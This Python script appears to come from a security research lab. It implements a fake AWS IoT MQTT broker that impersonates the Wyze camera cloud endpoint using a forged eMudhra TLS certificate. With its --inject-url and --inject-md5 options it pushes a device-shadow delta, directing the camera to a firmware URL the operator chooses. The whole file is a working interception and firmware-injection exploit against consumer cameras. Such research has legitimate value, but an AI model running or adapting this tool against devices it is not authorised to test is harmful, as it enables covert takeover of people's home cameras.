#!/usr/bin/env python3
"""Minimal MQTT 3.1.1 broker for the Wyze cloud emulation, with mutual TLS.

The camera's own cloud client connects to `a24rq1e5m4mtei.iot.us-west-2.amazonaws.com`
with its provisioned AWS IoT certificate. This broker terminates that TLS session
under a forged eMudhra leaf, **verifies the device certificate against the AWS IoT
rootCA**, and speaks just enough MQTT for the shadow path:

  CONNECT -> CONNACK, SUBSCRIBE -> SUBACK, PUBLISH (QoS 0/1) -> PUBACK,
  PINGREQ -> PINGRESP, DISCONNECT.

ALPN is `x-amzn-mqtt-ca`, which the device offers and AWS requires.

  wyze_mqtt_broker.py --mac 80482C4BCF0B [--port 8883]
  wyze_mqtt_broker.py --mac ... --inject-url URL --inject-md5 MD5   # push a delta

The device certificate is rejected unless it chains to the rootCA in the same
per-device directory, so a plain TLS client without a client cert cannot connect.
"""
import argparse
import json
import os
import socket
import ssl
import struct
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
CHAIN = os.environ.get("CHAIN", os.path.join(HERE, "..", "certs", "emudhra", "serve.pem"))
IOT_DIR = os.path.expanduser("~/.config/fss-lab/wyze_iot")
ALPN = "x-amzn-mqtt-ca"


def read_packet(sock):
    head = sock.recv(1)
    if not head:
        return None, None
    mult, length, i = 1, 0, 0
    while True:
        b = sock.recv(1)
        if not b:
            return None, None
        length += (b[0] & 0x7F) * mult
        mult *= 128
        i += 1
        if not b[0] & 0x80 or i > 3:
            break
    body = b""
    while len(body) < length:
        chunk = sock.recv(length - len(body))
        if not chunk:
            return None, None
        body += chunk
    return head[0], body


def enc_len(n):
    out = b""
    while True:
        d = n % 128
        n //= 128
        out += bytes([d | (0x80 if n else 0)])
        if not n:
            return out


def packet(kind, body, flags=0):
    return bytes([(kind << 4) | flags]) + enc_len(len(body)) + body


def publish(sock, topic, payload, qos=0):
    tb = topic.encode()
    body = struct.pack(">H", len(tb)) + tb
    if qos:
        body += struct.pack(">H", 1)
    sock.sendall(packet(3, body + payload, 0x02 if qos else 0x00))


def handle(conn, addr, args):
    peer = conn.getpeercert() or {}
    cn = next((v for rdn in peer.get("subject", ()) for k, v in rdn if k == "commonName"), "?")
    print(f"[{addr[0]}] TLS ok alpn={conn.selected_alpn_protocol()} client_cn={cn!r}", flush=True)

    kind, body = read_packet(conn)
    if kind is None or kind >> 4 != 1:
        print(f"[{addr[0]}] not a CONNECT", flush=True)
        return
    try:
        plen = struct.unpack(">H", body[10:12])[0]
        cid = body[12:12 + plen].decode(errors="replace")
    except Exception:
        cid = "?"
    print(f"[{addr[0]}] CONNECT client_id={cid!r}", flush=True)
    conn.sendall(packet(2, b"\x00\x00"))

    while True:
        kind, body = read_packet(conn)
        if kind is None:
            print(f"[{addr[0]}] closed", flush=True)
            return
        t = kind >> 4
        if t == 8:
            pid = body[:2]
            topics, i = [], 2
            while i < len(body):
                ln = struct.unpack(">H", body[i:i + 2])[0]
                topics.append(body[i + 2:i + 2 + ln].decode(errors="replace"))
                i += 2 + ln + 1
            print(f"[{addr[0]}] SUBSCRIBE {topics}", flush=True)
            conn.sendall(packet(9, pid + b"".join(b"\x01" for _ in topics)))
            if args.inject_url:
                threading.Thread(target=inject, args=(conn, topics, args), daemon=True).start()
        elif t == 3:
            qos = (kind >> 1) & 3
            ln = struct.unpack(">H", body[:2])[0]
            topic = body[2:2 + ln].decode(errors="replace")
            print(f"[{addr[0]}] <- PUBLISH {topic} {body[2 + ln:2 + ln + 160]!r}", flush=True)
            if qos == 1:
                conn.sendall(packet(4, body[2 + ln:4 + ln]))
        elif t == 12:
            conn.sendall(packet(13, b""))
        elif t == 10:
            conn.sendall(packet(11, body[:2]))
        elif t == 14:
            print(f"[{addr[0]}] DISCONNECT", flush=True)
            return


def inject(conn, topics, args):
    """Answer a shadow get and push the delta once the device subscribes."""
    time.sleep(args.delay)
    mac = args.mac
    doc = {"state": {"desired": {"url": args.inject_url, "md5": args.inject_md5,
                                 "model": args.model, "sub_mac": mac.upper()},
                     "reported": {}}, "version": 1, "timestamp": 1}
    for tp in topics:
        if tp.endswith("/shadow/name/wyze-service/get"):
            try:
                publish(conn, tp + "/accepted", json.dumps(doc).encode())
                print(f"  -> get/accepted", flush=True)
            except OSError:
                return
    time.sleep(1)
    delta = {"state": {"desired": doc["state"]["desired"]}, "version": 999}
    tp = f"$aws/things/{mac}/shadow/name/wyze-service/update/delta"
    for _ in range(args.repeat):
        try:
            publish(conn, tp, json.dumps(delta).encode())
            print(f"  -> delta", flush=True)
        except OSError:
            return
        time.sleep(2)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mac", required=True)
    ap.add_argument("--port", type=int, default=8883)
    ap.add_argument("--cert", default=CHAIN)
    ap.add_argument("--key", default=os.path.join(HERE, "..", "certs", "emudhra", "leaf.key"))
    ap.add_argument("--inject-url")
    ap.add_argument("--inject-md5")
    ap.add_argument("--model", default="HL_CAM4")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--repeat", type=int, default=3)
    a = ap.parse_args()

    d = os.path.join(IOT_DIR, a.mac.upper())
    root = os.path.join(d, "rootCA.crt")
    if not os.path.isfile(root):
        print(f"missing {root}", file=sys.stderr)
        return 2

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(a.cert, a.key)
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.load_verify_locations(root)
    ctx.set_alpn_protocols([ALPN])

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", a.port))
    srv.listen(8)
    print(f"broker on :{a.port} alpn={ALPN} client-ca={root}", flush=True)
    while True:
        raw, addr = srv.accept()
        try:
            conn = ctx.wrap_socket(raw, server_side=True)
        except ssl.SSLError as exc:
            print(f"[{addr[0]}] TLS rejected: {exc}", flush=True)
            raw.close()
            continue
        threading.Thread(target=handle, args=(conn, addr, a), daemon=True).start()
    return 0


if __name__ == "__main__":
    sys.exit(main())
